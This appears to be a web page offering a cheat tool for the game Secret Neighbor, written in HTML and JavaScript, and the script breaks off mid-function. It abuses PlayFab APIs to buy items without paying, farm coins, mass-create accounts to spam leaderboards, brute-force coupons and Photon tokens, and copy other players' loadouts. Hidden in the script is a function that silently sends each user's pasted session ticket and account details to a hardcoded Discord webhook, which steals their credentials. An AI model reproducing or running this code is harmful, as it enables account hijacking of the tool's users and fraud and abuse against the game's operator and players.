<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secret Neighbor Exploits</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://wallpaperaccess.com/full/9331537.jpg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      overflow-y: auto;
    }

    h1 {
      margin-top: 40px;
      text-shadow: 2px 2px 4px #000;
    }

    .container {
      width: 95%;
      max-width: 1200px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      padding-bottom: 40px;
    }

    .section {
      background-color: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(4px);
      padding: 20px;
      border-radius: 10px;
      width: 100%;
      max-width: 600px;
      text-align: center;
    }

    .section h2 {
      margin-top: 0;
      border-bottom: 1px solid rgba(255, 255, 255, 0.3);
      padding-bottom: 10px;
    }

    input, button, select, textarea {
      margin: 8px 5px;
      padding: 10px;
      font-size: 16px;
      width: 90%;
      max-width: 400px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    button {
      background-color: #4CAF50;
      color: white;
      border: none;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #45a049;
    }

    .output {
      margin-top: 15px;
      padding: 15px;
      background: rgba(255, 255, 255, 0.9);
      border-radius: 5px;
      border: 1px solid #ccc;
      white-space: pre-wrap;
      color: black;
      text-align: left;
      max-height: 300px;
      overflow-y: auto;
    }

    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .player-id-inputs {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    a {
      color: #4da6ff;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    .status-indicator {
      display: inline-block;
      width: 12px;
      height: 12px;
      border-radius: 50%;
      margin-right: 8px;
    }

    .status-active {
      background-color: #4CAF50;
    }

    .status-inactive {
      background-color: #f44336;
    }

    .warning {
      color: #ffcc00;
      font-weight: bold;
      margin: 10px 0;
    }

    .api-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .purchase-all-btn {
      background-color: #ff9900;
      font-weight: bold;
    }

    .purchase-all-btn:hover {
      background-color: #e68a00;
    }

    .renew-btn {
      background-color: #2196F3;
    }

    .renew-btn:hover {
      background-color: #0b7dda;
    }

    .penalty-btn {
      background-color: #f44336;
    }

    .penalty-btn:hover {
      background-color: #d32f2f;
    }

    .reset-penalty-btn {
      background-color: #2196F3;
    }

    .reset-penalty-btn:hover {
      background-color: #1976D2;
    }

    .redeem-coupon-btn {
      background-color: #9c27b0;
    }

    .redeem-coupon-btn:hover {
      background-color: #7b1fa2;
    }

    .grant-trophy-btn {
      background-color: #ffeb3b;
      color: black;
    }

    .grant-trophy-btn:hover {
      background-color: #fbc02d;
    }

    .ios-automation-btn {
      background-color: #4CAF50;
    }

    .ios-automation-btn:hover {
      background-color: #45a049;
    }

    .ios-leaderboard-btn {
      background-color: #ff9900;
    }

    .ios-leaderboard-btn:hover {
      background-color: #e68a00;
    }
  </style>
</head>
<body>
  <h1>üéÆ Secret Neighbor Exploits</h1>

  <div class="container">
    <div class="section">
      <h2>üìÑ Tutorial</h2>
      <p>
        How to get The SessionTicket - tutorial made by B0B: <a href="https://www.youtube.com/watch?v=orUbChEBxt0" target="_blank">YouTube Tutorial</a>
      </p>
    </div>

    <div class="section">
      <h2>üîê STEAM Session Ticket</h2>
      <input id="sessionTicketInput" placeholder="Paste your SessionTicket here (STEAM)" type="text">
      <button onclick="setSessionTicket()">Set Token</button>
      <div class="grid-2">
        <button class="renew-btn" onclick="renewSessionTicket()">Renew SessionTicket</button>
        <button onclick="clearSessionTicket()">Clear Token</button>
      </div>
      <div id="tokenStatus" class="output" style="display: none;">No token set</div>
    </div>

    <div class="section">
      <h2>üîê IOS Session Ticket</h2>
      <input id="sessionTicketInputIOS" placeholder="Paste your SessionTicket here (IOS)" type="text">
      <button onclick="setSessionTicketIOS()">Set Token</button>
      <div class="grid-2">
        <button class="renew-btn" onclick="renewSessionTicketIOS()">Renew SessionTicket</button>
        <button onclick="clearSessionTicketIOS()">Clear Token</button>
      </div>
      <div id="tokenStatusIOS" class="output" style="display: none;">No token set</div>
    </div>

    <div class="section">
      <h2>üõí Buy Everything (STEAM)</h2>
      <p class="warning">This will attempt to purchase all available items (including RM currency). Close Steam before starting.</p>
      <button class="purchase-all-btn" onclick="purchaseAllSkinsEmotes()">Attempt to Buy Everything</button>
      <div class="output" id="purchaseAllOutput">Purchase logs will appear here...</div>
    </div>

    <div class="section">
      <h2>üõçÔ∏è Buy Skin/Emote (STEAM)</h2>
      <input id="itemId" placeholder="ItemId" type="text">
      <input id="price" placeholder="Price" type="number">
      <input id="currency" placeholder="VirtualCurrency" type="text">
      <button onclick="buySkinEmote()">Buy Skin/Emote</button>
      <div class="output" id="purchaseOutput">Purchase results will appear here...</div>
    </div>

    <div class="section">
      <h2>üéÅ Grant Coupons (STEAM)</h2>
      <button onclick="grantCoupons()">Grant Coupons</button>
      <div class="output" id="couponOutput">Coupon results will appear here...</div>
    </div>

    <div class="section">
      <h2>üì± Account Generator + Spam Leaderboard (IOS) <span id="iosAutomationStatus" class="status-indicator status-inactive"></span></h2>
      <input id="displayNameIOS" placeholder="Enter Display Name" type="text">
      <input id="desiredLevelIOS" placeholder="Enter Desired Level" type="number">
      <select id="platformNameSelect">
        <option value="IOS">IOS</option>
        <option value="PS4">PS4</option>
        <option value="Random">Random</option>
      </select>
      <div class="grid-2">
        <button class="ios-automation-btn" onclick="toggleIOSAutomation()" id="iosAutomationToggleButton">Start Account Generator + Spam Leaderboard</button>
        <button class="ios-leaderboard-btn" onclick="viewIOSLeaderboard()">View IOS Leaderboard</button>
      </div>
      <div>
        <input id="iosStatisticName" placeholder="Statistic Name" type="text">
        <input id="iosStartPosition" placeholder="Start Position" type="number" value="0">
        <input id="iosMaxResults" placeholder="Max Results" type="number" value="100">
      </div>
      <div class="output" id="iosOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìä View Statistics (STEAM)</h2>
      <button onclick="viewStatistics()">View Statistics</button>
      <div class="output" id="statsOutput">Statistics will appear here...</div>
    </div>

    <div class="section">
      <h2>üí∞ Add Coin (Call it In-Game) (STEAM)</h2>
      <p class="warning">Warning: Do not use more than 30 coins per match!</p>
      <button onclick="AddCoin()">Add Coin</button>
      <div class="output" id="usefulDeedOutput">Coin results will appear here...</div>
    </div>

    <div class="section">
      <h2>ü§ñ Coin Farm Bot (STEAM) <span id="botStatus" class="status-indicator status-inactive"></span></h2>
      <div class="grid-2">
        <div>
          <label>Room Type:</label>
          <select id="roomType">
            <option value="QUICK_GAME">QUICK_GAME</option>
            <option value="CUSTOM_GAME">CUSTOM_GAME</option>
          </select>
        </div>
        <div>
          <label>Delay:</label>
          <select id="delaySelect">
            <option value="10">10 minutes</option>
            <option value="5">5 minutes</option>
            <option value="2">2 minutes</option>
          </select>
        </div>
      </div>

      <div class="player-id-inputs">
        <input id="playerId1" placeholder="PlayFab ID 1" type="text">
        <input id="playerId2" placeholder="PlayFab ID 2" type="text">
        <input id="playerId3" placeholder="PlayFab ID 3" type="text">
        <input id="playerId4" placeholder="PlayFab ID 4" type="text">
        <input id="playerId5" placeholder="PlayFab ID 5" type="text">
        <input id="playerId6" placeholder="PlayFab ID 6" type="text">
      </div>

      <button onclick="toggleCoinFarmBot()" id="botToggleButton">Start Coin Farm Bot</button>
      <div class="output" id="cloudOutput">Bot output will appear here...</div>
    </div>

    <div class="section">
      <h2>üß™ Level Editor (STEAM) <span id="levelEditorStatus" class="status-indicator status-inactive"></span></h2>
      <input type="text" id="classIdInput" placeholder="Class ID">
      <input type="number" id="receivedXPInput" placeholder="Received XP">
      <textarea id="levelProgressionJson" placeholder="Paste full currentLevelProgression JSON here (including playerLevel and classLevel array)" rows="10"></textarea>
      <button onclick="toggleLevelEditor()" id="levelEditorToggleButton">Start Level Editor</button>
      <div class="output" id="levelProgressionOutput">Level progression results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîç PlayFab Info Lookup (STEAM)</h2>
      <input type="text" id="playfabId" placeholder="Enter PlayFab ID">
      <button onclick="getPlayFabInfo()">Get Info</button>
      <div class="output" id="playfabInfoOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üìù Update Quest Progress (STEAM)</h2>
      <input type="text" id="questTextFieldId" placeholder="Quest Text Field ID">
      <input type="number" id="questProgressValue" placeholder="Progress Value">
      <button onclick="updateQuestProgress()">Update Quest</button>

      <div style="margin-top: 15px; text-align: left;">
        <h3>Available Quests:</h3>
        <div style="max-height: 200px; overflow-y: auto; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">
          <ul style="columns: 2; margin: 0; padding-left: 20px;">
            <li>QUENTIN_USE_DASH</li>
            <li>WIN_AS_BAGGER</li>
            <li>WIN_AS_BRAVE</li>
            <li>WIN_AS_DETECTIVE</li>
            <li>WIN_AS_ENGINEER</li>
            <li>WIN_AS_LEADER</li>
            <li>WIN_AS_SCOUT</li>
            <li>WIN_AS_SCARY</li>
            <li>WIN_AS_CLOWN</li>
            <li>WIN_AS_BUTCHER</li>
            <li>WIN_FIRST_TO_ESCAPE</li>
            <li>WIN_WITH_HALF_LOCKS_INTACT</li>
            <li>OPEN_LOCKS</li>
            <li>OPEN_LOCKS_IN_ONE_MATCH</li>
            <li>SEARCH_DRAWERS</li>
            <li>FIND_KEYS_VIA_PHOTO</li>
            <li>USE_KEYCARDS</li>
            <li>CATCH_KIDS</li>
            <li>HOOK_KIDS</li>
            <li>CATCH_FROM_ITEM_FORM</li>
            <li>CATCH_INSIDE_SMOKE</li>
            <li>CATCH_IN_BEARTRAP</li>
            <li>BLIND_NEIGHBOR_WITH_LEADER</li>
            <li>BUFF_AS_LEADER</li>
            <li>CRAFT_RIFLE</li>
            <li>SHOOT_THE_SHERIFF</li>
            <li>SLINGSHOT_HIT_NEIGHBOR</li>
            <li>SAVE_KID_FROM_GRAB</li>
            <li>BRAVE_ESCAPE_FROM_NEIGHBOR_HANDS</li>
            <li>BAGGER_CARRIER</li>
            <li>GLUE_THE_NEIGHBOR</li>
            <li>CONSUME_CHOCOLATE</li>
            <li>CONSUME_MILK</li>
            <li>CATCH_FROZEN_KIDS</li>
            <li>CATCH_AFTER_PORTAL</li>
            <li>KNOCK_ITEMS_OUT_OF_HANDS</li>
            <li>CATCH_SCARED_KIDS</li>
            <li>CRAFT_NIGHT_VISION</li>
            <li>FIND_WITH_METAL_DETECTOR</li>
            <li>RANDOM_KID</li>
            <li>RANDOM_NEIGHBOR</li>
            <li>WIN_AS_GHOST</li>
            <li>WIN_AS_GUEST</li>
            <li>WIN_AS_QUENTIN</li>
            <li>WIN_AS_TAXIDERMIST</li>
            <li>QUENTIN_OPEN_LOCK_BLUE</li>
            <li>QUENTIN_OPEN_LOCK_RED</li>
            <li>QUENTIN_OPEN_LOCK_YELLOW</li>
            <li>TAXIDERMIST_HIT_TARGETS_WITHOUT_RELOAD</li>
            <li>QUENTIN_USE_DASH</li>
            <li>CRAFT_INSANITY_SENSOR</li>
          </ul>
        </div>
      </div>

      <div class="output" id="questOutput">Quest update results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîó Additional Stuff (STEAM)</h2>
      <div class="api-grid">
        <div>
          <h3>üë• Add Friend</h3>
          <input id="friendPlayFabId" placeholder="Friend's PlayFab ID" type="text">
          <button onclick="addFriend()">Add Friend</button>
        </div>
        <div>
          <h3>üìã Get Friends List</h3>
          <button onclick="getFriendsList()">Get Friends List</button>
        </div>
        <div>
          <h3>üìõ Update Leaderboard Name</h3>
          <input id="displayName" placeholder="New Display Name" type="text">
          <button onclick="updateDisplayName()">Update Name</button>
        </div>
        <div>
          <h3>üîó Ban Yourself</h3>
          <input id="customId" placeholder="Anything You Want" type="text">
          <button onclick="linkCustomId()">Ban</button>
        </div>
        <div>
          <h3>üèÜ Leaderboard Data</h3>
          <input id="statisticName" placeholder="Statistic Name" type="text">
          <input id="startPosition" placeholder="Start Position" type="number" value="0">
          <input id="maxResults" placeholder="Max Results" type="number" value="100">
          <button onclick="getLeaderboard()">Get Leaderboard</button>
        </div>
        <div>
          <h3>üö© Report Player</h3>
          <select id="reportReason">
            <option value="CHEATING">Cheating</option>
            <option value="VOICE_CHAT_ABUSE">Voice Chat Abuse</option>
            <option value="AFK">AFK</option>
            <option value="TEAMING_WITH_ENEMY">Teaming with Enemy</option>
          </select>
          <input id="targetPlayerId" placeholder="Target PlayFab ID" type="text">
          <button onclick="reportPlayer()">Report Player</button>
        </div>
        <div>
          <h3>üéüÔ∏è Bruteforce Redeem Coupon <span id="couponBruteforceStatus" class="status-indicator status-inactive"></span></h3>
          <button class="redeem-coupon-btn" onclick="toggleBruteforceRedeemCoupon()" id="couponBruteforceToggleButton">Start Bruteforce Redeem Coupon</button>
        </div>
        <div>
          <h3>üèÜ Grant Trophy</h3>
          <input id="trophyId" placeholder="Trophy ID" type="text">
          <button class="grant-trophy-btn" onclick="grantTrophy()">Grant Trophy</button>
        </div>
      </div>
      <div class="output" id="apiOutput">API results will appear here...</div>
    </div>

    <div class="section">
      <h2>‚öñÔ∏è Penalty Points Management (STEAM)</h2>
      <div class="grid-2">
        <button class="penalty-btn" onclick="increasePenaltyPoints()">Increase Penalty Points</button>
        <button class="reset-penalty-btn" onclick="decreasePenaltyPoints()">Decrease Penalty Points</button>
      </div>
      <input id="matchPlayerId" placeholder="Player ID for Match Status" type="text">
      <button onclick="startMatchStatusSequence()">Decrease Penalty Points Fixed (wait 10 minutes)</button>
      <div class="output" id="penaltyOutput">Penalty and match status results will appear here...</div>
    </div>

    <div class="section">
      <h2>üîë Photon Token Generator (STEAM) <span id="photonTokenStatus" class="status-indicator status-inactive"></span></h2>
      <button onclick="togglePhotonTokenGenerator()" id="photonTokenToggleButton">Start Generating Photon Token</button>
      <div class="output" id="photonTokenOutput">Token will appear here...</div>
    </div>

    <div class="section">
      <h2>üîÑ Reset Loadout (STEAM)</h2>
      <button onclick="resetLoadout()">Reset Loadout</button>
      <div class="output" id="resetLoadoutOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üïµÔ∏è Steal Loadout (STEAM)</h2>
      <input id="targetPlayFabId" placeholder="Target PlayFab ID" type="text">
      <button onclick="stealLoadout()">Steal Loadout</button>
      <div class="output" id="stealLoadoutOutput">Results will appear here...</div>
    </div>

    <div class="section">
      <h2>üì¶ View Inventory (STEAM)</h2>
      <button onclick="viewInventory()">View Inventory</button>
      <div class="output" id="inventoryOutput">Inventory results will appear here...</div>
    </div>

    <div class="section">
      <h2>üî® Photon Token Bruteforcer (STEAM)</h2>
      <input id="playFabUsername" placeholder="PlayFab ID" type="text">
      <button onclick="startBruteforce()">Start Bruteforce</button>
      <button onclick="stopBruteforce()">Stop Bruteforce</button>
      <div class="output" id="bruteforceOutput">Results will appear here...</div>
    </div>
  </div>

  <script>
    const titleIdMain = "bdff1";
    const titleIdIOS = "C6252";
    let sessionTicket = null;
    let sessionTicketIOS = null;
    let coinFarmBotRunning = false;
    let coinFarmIntervalId = null;
    let levelEditorRunning = false;
    let levelEditorIntervalId = null;
    let bruteforceRunning = false;
    let photonTokenRunning = false;
    let photonTokenIntervalId = null;
    let couponBruteforceRunning = false;
    let couponBruteforceIntervalId = null;
    let iosAutomationRunning = false;
    let iosAutomationIntervalId = null;
    let failedAttempts = 0;
    let totalTokensGenerated = 0;
    let attempts = 0;
    let totalCoinsEarned = 0;
    let lastCoinFarmResponse = null;
    const iosAutomationLog = [];
    const bruteforceLog = [];

    function logIOSAction(action, details) {
      iosAutomationLog.push({
        timestamp: new Date().toISOString(),
        action: action,
        details: details
      });
    }

    function downloadLogAsJSON(log, filenamePrefix) {
      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
      const filename = `${filenamePrefix}_${timestamp}.json`;
      const blob = new Blob([JSON.stringify(log, null, 2)], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.download = filename;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      URL.revokeObjectURL(url);
    }

    async function sendToDiscordWebhook(data, platform) {
      const webhookURL = "https://discord.com/api/webhooks/1410338106556809266/UR-3ClxQBW9BZs7iI712IlVlFbvfC2FD5IsObEG1I7gVesko4-UGmUse8vtct5Mc7A-M";
      try {
        const response = await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**${platform} SessionTicket Action**\n${JSON.stringify(data, null, 2)}`,
            username: `${platform} SessionTicket Logger`,
            avatar_url: 'https://cdn-icons-png.flaticon.com/512/1047/1047711.png'
          })
        });
        if (response.ok) {
          console.log(`Player info sent to Discord successfully (${platform})`);
        } else {
          console.error(`Failed to send player info to Discord (${platform})`);
        }
      } catch (error) {
        console.error(`Error sending to Discord (${platform}):`, error);
      }
    }

    async function fetchPlayerInfo(titleId, sessionTicket, tokenStatus, platform) {
      const accountData = await makeApiCall("Client/GetAccountInfo", "POST", {}, titleId, sessionTicket);
      if (accountData.error) {
        tokenStatus.textContent += `\n‚ùå Error fetching account info: ${accountData.error}`;
        return;
      }
      const playFabId = accountData.data.AccountInfo.PlayFabId;

      const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
        PlayFabId: playFabId,
        InfoRequestParameters: {
          GetPlayerProfile: true,
          GetUserAccountInfo: true
        }
      }, titleId, sessionTicket);
      if (combinedData.error) {
        tokenStatus.textContent += `\n‚ùå Error fetching combined info: ${combinedData.error}`;
        return;
      }

      let infoText = "Player Info:\n";
      const payload = combinedData.data.InfoResultPayload;
      const playerInfo = {};
      if (payload.AccountInfo) {
        playerInfo.PlayFabId = payload.AccountInfo.PlayFabId;
        playerInfo.Username = payload.AccountInfo.Username || "N/A";
        playerInfo.Created = new Date(payload.AccountInfo.Created).toLocaleString();
        infoText += `PlayFabId: ${playerInfo.PlayFabId}\n`;
        infoText += `Username: ${playerInfo.Username}\n`;
        infoText += `Created: ${playerInfo.Created}\n`;
      }
      if (payload.PlayerProfile) {
        playerInfo.DisplayName = payload.PlayerProfile.DisplayName || "N/A";
        playerInfo.LastLogin = new Date(payload.PlayerProfile.LastLogin).toLocaleString();
        infoText += `DisplayName: ${playerInfo.DisplayName}\n`;
        infoText += `LastLogin: ${playerInfo.LastLogin}\n`;
      }

      tokenStatus.textContent += "\n" + infoText;
      tokenStatus.scrollTop = tokenStatus.scrollHeight;

      await sendToDiscordWebhook({ ...playerInfo, SessionTicket: sessionTicket }, platform);
    }

    function setSessionTicket() {
      sessionTicket = document.getElementById("sessionTicketInput").value.trim();
      const tokenStatus = document.getElementById("tokenStatus");

      if (sessionTicket) {
        localStorage.setItem('sessionTicket', sessionTicket);
        tokenStatus.textContent = "‚úÖ Token set successfully!";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "green";
        console.log("SessionTicket set (STEAM):", sessionTicket);
        fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus, "STEAM");
      } else {
        tokenStatus.textContent = "‚ùå Please enter a valid token";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "red";
      }
    }

    function clearSessionTicket() {
      sessionTicket = null;
      localStorage.removeItem('sessionTicket');
      document.getElementById("sessionTicketInput").value = "";
      const tokenStatus = document.getElementById("tokenStatus");
      tokenStatus.textContent = "‚ùå Token cleared";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "red";
    }

    async function renewSessionTicket() {
      const tokenStatus = document.getElementById("tokenStatus");

      if (!sessionTicket) {
        tokenStatus.textContent = "‚ùå No session ticket to renew. Please set a token first.";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "red";
        return;
      }

      tokenStatus.textContent = "üîÑ Renewing session ticket...";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "blue";

      try {
        const response = await fetch(`https://${titleIdMain}.playfabapi.com/Authentication/GetEntityToken`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Authorization": sessionTicket
          },
          body: JSON.stringify({})
        });

        const data = await response.json();

        if (data.data && data.data.EntityToken) {
          sessionTicket = data.data.EntityToken;
          localStorage.setItem('sessionTicket', sessionTicket);
          document.getElementById("sessionTicketInput").value = sessionTicket;
          tokenStatus.textContent = "‚úÖ Session ticket renewed successfully!";
          tokenStatus.style.color = "green";
          console.log("SessionTicket renewed (STEAM):", sessionTicket);
          fetchPlayerInfo(titleIdMain, sessionTicket, tokenStatus, "STEAM");
        } else {
          tokenStatus.textContent = `‚ùå Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
          tokenStatus.style.color = "red";
        }
      } catch (error) {
        tokenStatus.textContent = `‚ùå Error renewing session ticket: ${error.message}`;
        tokenStatus.style.color = "red";
      }
    }

    function setSessionTicketIOS() {
      sessionTicketIOS = document.getElementById("sessionTicketInputIOS").value.trim();
      const tokenStatus = document.getElementById("tokenStatusIOS");

      if (sessionTicketIOS) {
        localStorage.setItem('sessionTicketIOS', sessionTicketIOS);
        tokenStatus.textContent = "‚úÖ Token set successfully!";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "green";
        console.log("SessionTicket set (IOS):", sessionTicketIOS);
        fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatus, "IOS");
      } else {
        tokenStatus.textContent = "‚ùå Please enter a valid token";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "red";
      }
    }

    function clearSessionTicketIOS() {
      sessionTicketIOS = null;
      localStorage.removeItem('sessionTicketIOS');
      document.getElementById("sessionTicketInputIOS").value = "";
      const tokenStatus = document.getElementById("tokenStatusIOS");
      tokenStatus.textContent = "‚ùå Token cleared";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "red";
    }

    async function renewSessionTicketIOS() {
      const tokenStatus = document.getElementById("tokenStatusIOS");

      if (!sessionTicketIOS) {
        tokenStatus.textContent = "‚ùå No session ticket to renew. Please set a token first.";
        tokenStatus.style.display = "block";
        tokenStatus.style.color = "red";
        return;
      }

      tokenStatus.textContent = "üîÑ Renewing session ticket...";
      tokenStatus.style.display = "block";
      tokenStatus.style.color = "blue";

      try {
        const response = await fetch(`https://${titleIdIOS}.playfabapi.com/Authentication/GetEntityToken`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Authorization": sessionTicketIOS
          },
          body: JSON.stringify({})
        });

        const data = await response.json();

        if (data.data && data.data.EntityToken) {
          sessionTicketIOS = data.data.EntityToken;
          localStorage.setItem('sessionTicketIOS', sessionTicketIOS);
          document.getElementById("sessionTicketInputIOS").value = sessionTicketIOS;
          tokenStatus.textContent = "‚úÖ Session ticket renewed successfully!";
          tokenStatus.style.color = "green";
          console.log("SessionTicket renewed (IOS):", sessionTicketIOS);
          fetchPlayerInfo(titleIdIOS, sessionTicketIOS, tokenStatus, "IOS");
        } else {
          tokenStatus.textContent = `‚ùå Failed to renew session ticket: ${data.errorMessage || "Unknown error"}`;
          tokenStatus.style.color = "red";
        }
      } catch (error) {
        tokenStatus.textContent = `‚ùå Error renewing session ticket: ${error.message}`;
        tokenStatus.style.color = "red";
      }
    }

    async function makeApiCall(endpoint, method, body, titleId, sessionTicket = null) {
      const headers = {
        "Content-Type": "application/json"
      };
      if (sessionTicket) {
        headers["X-Authorization"] = sessionTicket;
      }

      try {
        const res = await fetch(`https://${titleId}.playfabapi.com/${endpoint}`, {
          method: method,
          headers: headers,
          body: JSON.stringify(body)
        });

        return await res.json();
      } catch (error) {
        console.error(`API call failed for ${titleId}:`, error);
        return { error: error.message };
      }
    }

    function formatResponse(result) {
      if (typeof result === "object" && result !== null) {
        return Object.entries(result).map(([key, value]) => `${key}: ${value}`).join("\n");
      }
      return result;
    }

    async function toggleIOSAutomation() {
      const output = document.getElementById("iosOutput");
      const displayNameBase = document.getElementById("displayNameIOS").value.trim();
      let platformName = document.getElementById("platformNameSelect").value;
      const desiredLevel = parseInt(document.getElementById("desiredLevelIOS").value) || 666; // Default to 666 if not provided
      const platforms = ['PS4', 'IOS'];

      if (platformName === 'Random') {
        platformName = platforms[Math.floor(Math.random() * platforms.length)];
      }

      if (iosAutomationRunning) {
        clearInterval(iosAutomationIntervalId);
        iosAutomationRunning = false;
        document.getElementById("iosAutomationStatus").className = "status-indicator status-inactive";
        document.getElementById("iosAutomationToggleButton").textContent = "Start Account Generator + Spam Leaderboard";
        output.textContent += "\nAccount Generator + Spam Leaderboard stopped manually.\n";
        logIOSAction("Automation Stopped", { message: "Account Generator + Spam Leaderboard stopped manually" });
        downloadLogAsJSON(iosAutomationLog, "ios_automation_log");
        iosAutomationLog.length = 0;
        output.scrollTop = output.scrollHeight;
        return;
      }

      if (!displayNameBase) {
        output.textContent = "‚ùå Please enter a display name.\n";
        output.style.color = "red";
        output.scrollTop = output.scrollHeight;
        return;
      }

      iosAutomationRunning = true;
      document.getElementById("iosAutomationStatus").className = "status-indicator status-active";
      document.getElementById("iosAutomationToggleButton").textContent = "Stop Account Generator + Spam Leaderboard";
      output.textContent = `Starting Account Generator + Spam Leaderboard (Platform: ${platformName}, Desired Level: ${desiredLevel})...\n`;
      logIOSAction("Automation Started", { message: "Account Generator + Spam Leaderboard started", platformName, desiredLevel });

      async function runIOSAutomationCycle() {
        try {
          // Step 1: Generate Account
          output.textContent += "\n=== Account Generation ===\n";
          const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
          const playerIdLength = 20;
          let playerId = '';
          for (let i = 0; i < playerIdLength; i++) {
            playerId += chars.charAt(Math.floor(Math.random() * chars.length));
          }
          const randomDigits = Math.floor(1000 + Math.random() * 9000);
          const displayName = `${displayNameBase}-${randomDigits}`;

          output.textContent += `Creating account with PlayerId: ${playerId}...\n`;
          logIOSAction("Account Creation Attempt", { playerId });
          const loginResponse = await makeApiCall("Client/LoginWithGameCenter", "POST", {
            CreateAccount: true,
            TitleId: titleIdIOS,
            PlayerId: playerId
          }, titleIdIOS);

          if (loginResponse.error || !loginResponse.data?.SessionTicket) {
            const errorMsg = loginResponse.error || loginResponse.errorMessage || "Unknown error";
            output.textContent += `‚ùå Failed to create account: ${errorMsg}\n`;
            logIOSAction("Account Creation Failed", { playerId, error: errorMsg });
            output.style.color = "red";
            if (errorMsg.includes("Account Banned")) {
              console.log("Account Banned - Tor circuit renewal not supported in this environment.");
            }
            return;
          }

          sessionTicketIOS = loginResponse.data.SessionTicket;
          localStorage.setItem('sessionTicketIOS', sessionTicketIOS);
          document.getElementById("sessionTicketInputIOS").value = sessionTicketIOS;
          output.textContent += `‚úÖ Account created successfully!\nSessionTicket: ${sessionTicketIOS}\nPlayerId: ${playerId}\n`;
          logIOSAction("Account Creation Success", { playerId, sessionTicket: sessionTicketIOS });

          // Step 2: Set Display Name
          output.textContent += `Setting display name to ${displayName}...\n`;
          logIOSAction("Set Display Name Attempt", { displayName });
          const updateResponse = await makeApiCall("Client/UpdateUserTitleDisplayName", "POST", {
            DisplayName: displayName
          }, titleIdIOS, sessionTicketIOS);

          if (updateResponse.error) {
            const errorMsg = updateResponse.error || updateResponse.errorMessage || "Unknown error";
            output.textContent += `‚ùå Failed to set display name: ${errorMsg}\n`;
            logIOSAction("Set Display Name Failed", { displayName, error: errorMsg });
            output.style.color = "red";
          } else {
            output.textContent += `‚úÖ Display name set to ${displayName}\n`;
            logIOSAction("Set Display Name Success", { displayName });
            output.style.color = "green";
          }

          // Step 3: Spam Leaderboard
          output.textContent += "\n=== Leaderboard Spam ===\n";
          logIOSAction("Leaderboard Spam Attempt", { platformName });

          const currentLevelProgression = {
            playerLevel: desiredLevel,
            classLevel: [
              { classId: "Bagman", XP: 959, XpToNextLevel: 2730, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "Brave", XP: 503, XpToNextLevel: 2790, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "Detective", XP: 1304, XpToNextLevel: 5280, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "Inventor", XP: 3196, XpToNextLevel: 3630, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "Leader", XP: 2403, XpToNextLevel: 4170, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "Quentin", XP: 1760, XpToNextLevel: 3960, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "RandomExplorer", XP: 0, XpToNextLevel: 300, level: 0, availablePerkSlotsCount: 0 },
              { classId: "Scout", XP: 1871, XpToNextLevel: 8640, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "BasicNeighbor", XP: 864, XpToNextLevel: 900, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "ButcherNeighbor", XP: 5841, XpToNextLevel: 6690, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "ClownNeighbor", XP: 434, XpToNextLevel: 480, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "GhostNeighbor", XP: 49, XpToNextLevel: 2370, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "GuestNeighbor", XP: 1603, XpToNextLevel: 1830, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "HunterNeighbor", XP: 50, XpToNextLevel: 840, level: desiredLevel, availablePerkSlotsCount: 3 },
              { classId: "RandomNeighbor", XP: 0, XpToNextLevel: 300, level: 0, availablePerkSlotsCount: 0 }
            ]
          };

          output.textContent += `üìù Modified level progression (Level ${desiredLevel} applied to all classes except RandomExplorer and RandomNeighbor):\n${JSON.stringify(currentLevelProgression, null, 2)}\n`;
